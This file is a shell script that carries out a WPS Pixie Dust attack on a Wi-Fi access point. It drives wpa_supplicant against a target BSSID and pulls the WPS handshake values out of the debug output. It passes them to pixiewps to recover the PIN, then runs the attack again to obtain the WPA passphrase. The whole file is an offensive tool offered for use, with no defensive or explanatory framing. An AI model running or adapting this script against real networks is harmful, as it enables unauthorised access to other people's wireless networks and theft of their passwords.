#!/bin/sh

TEMPDIR=$(mktemp -d)
TEMPFILE=$(mktemp --suffix=.conf)
FIFO=$(mktemp -u)
mkfifo $FIFO

BSSID=$1
PIN=$2
IFACE=$3
PIXIE=1

function quit() 
{
	PID=$(jobs -l | awk '{print $2}')
	echo $PID
	kill $PID
	rm -rf $TEMPDIR $TEMPFILE $FIFO
	exit
}

function resetPixie()
{
	PKE=''
	PKR=''
	EHASH1=''
	EHASH2=''
	AUTHKEY=''
	ENONCE=''
	PIXIE=0
}

function pixie()
{
	pixiewps -e "$PKE" -r "$PKR" -s "$EHASH1" -z "$EHASH2" -a "$AUTHKEY" -n "$ENONCE" --force
	if [ "$?" -eq 0 ]
	then
		PIN=$(pixiewps -e "$PKE" -r "$PKR" -s "$EHASH1" -z "$EHASH2" -a "$AUTHKEY" -n "$ENONCE" --force |\
			grep 'WPS pin' |\
			cut -d : -f 2)
		PIN=$(echo $PIN)
	fi
	
	resetPixie
}

function attack()
{
	printI "Launching wpa_supplicant"
	wpa_supplicant -K -d -D nl80211 -i $IFACE -c $TEMPFILE | tee $FIFO > /dev/null &
	
	#Send WPS_REG command to wpa_supplicant socket
	printI "Sending WPS_REG command to wpa_supplicant"
	sleep 5 && sendCMD

	#Launch wpa_supplicant & parse output
	while read -r LINE
	do
		#Parsing WPS messages
		if [ "$(echo "$LINE" | grep 'WPS: ')" ]
		then
			if [ "$(echo "$LINE" | grep 'Building Message M')" ]
			then
				printI "Sending WPS Message $(echo "$LINE" | awk '{print $4}')"
			elif [ "$(echo "$LINE" | grep 'Received M')" ]
			then
				printI "Received WPS Message $(echo "$LINE" | awk '{print $3}')"
			elif [ "$(echo "$LINE" | grep 'Received WSC_NACK')" ]
			then
				printI 'Received WSC NACK'
				printE 'Error: wrong PIN code'
				break
			elif [ "$(echo "$LINE" | grep 'Enrollee Nonce')" ] &&\
			   [ "$(echo "$LINE" | grep 'hexdump')" ]
			then
				ENONCE=$(gethex "$LINE")
				printG "E-Nonce: $ENONCE"
			elif [ "$(echo "$LINE" | grep 'DH own Public Key')" ] 
			then
				PKR=$(gethex "$LINE")
				printG "PKR: $PKR"
			elif [ "$(echo "$LINE" | grep 'DH peer Public Key')" ] &&\
			   [ "$(echo "$LINE" | grep 'hexdump')" ]
			then
				PKE=$(gethex "$LINE")
				printG "PKE: $PKE"
			elif [ "$(echo "$LINE" | grep 'AuthKey')" ]
			then
				AUTHKEY=$(gethex "$LINE")
				printG "AuthKey: $AUTHKEY"
			elif [ "$(echo "$LINE" | grep 'E-Hash1')" ]
			then
				EHASH1=$(gethex "$LINE")
				printG "E-Hash1: $EHASH1"
			elif [ "$(echo "$LINE" | grep 'E-Hash2')" ]
			then
				EHASH2=$(gethex "$LINE")
				printG "E-Hash2: $EHASH2"
			elif [ "$(echo "$LINE" | grep 'Networki\ Key')" ]
			then
				WPA_KEY=$(gethex "$LINE")
				printG "WPA pass: $WPA_KEY"
			fi

		#Status messages
		elif [ "$(echo "$LINE" | grep ':\ State: ')" ]
		then
			if [ "$(echo "$LINE" | grep -e '-> SCANNING')" ]
			then
				printI "Scanning…"
			fi
			
		elif [ "$(echo "$LINE" | grep 'WPS-FAIL')" ]
		then
			printE "wpa_supplicant returned WPS-FAIL"
			break
		elif [ "$(echo "$LINE" | grep 'Trying\ to\ authenticate\ with')" ]
		then
			printI "Authenticating..."
		elif [ "$(echo "$LINE" | grep 'Authentication response')" ]
		then
			printG "Authenticated"
		elif [ "$(echo "$LINE" | grep 'Trying to associate with')" ]
		then
			printI "Associating with AP..."
		elif [ "$(echo "$LINE" | grep 'Associated with')" ] &&\
		     [ "$(echo "$LINE" | grep $IFACE)" ]
		then
			printG "Associated with $BSSID"
		elif [ "$(echo "$LINE" | grep 'EAPOL: txStart')" ]
		then
			printI "Sending EAPOL Start..."
		elif [ "$(echo "$LINE" | grep 'EAP entering state IDENTITY')" ]
		then
			printI "Received Identity Requset"
		elif [ "$(echo "$LINE" | grep 'using real identity')" ]
		then
			printI "Sending Identity Response..."
		fi

	done < $FIFO
}

function sendCMD()
{
	echo "WPS_REG $BSSID $PIN" | nc -u -U $TEMPDIR/$IFACE &
	printI "Using PIN: $PIN"
}
function gethex()
{
	echo $1 | cut -d : -f 3 | sed --expression='s/ //g'
}
function printI()
{
	echo "[*] $@"
}
function printE()
{
	echo "[-] $@"
}
function printG()
{
	echo "[+] $@"
}

#Start here
#Write wpa_supplicant config to file
printI "Writing wpa_supplicant config"
echo -e "ctrl_interface=${TEMPDIR}\nctrl_interface_group=root\nupdate_config=1\n" > $TEMPFILE

attack

if [ "$PKE" ] && [ "$PKR" ] && [ "$EHASH1" ] && [ "$EHASH2" ] && [ "$ENONCE" ] && [ "$PIXIE" -eq 1 ]
then
	pixie
	printG "WPS pin: $(echo $PIN)"
	killall wpa_supplicant
	attack
else
	printE "Not enough data to run PixieDust"
fi


#Remove temp files and exit
quit
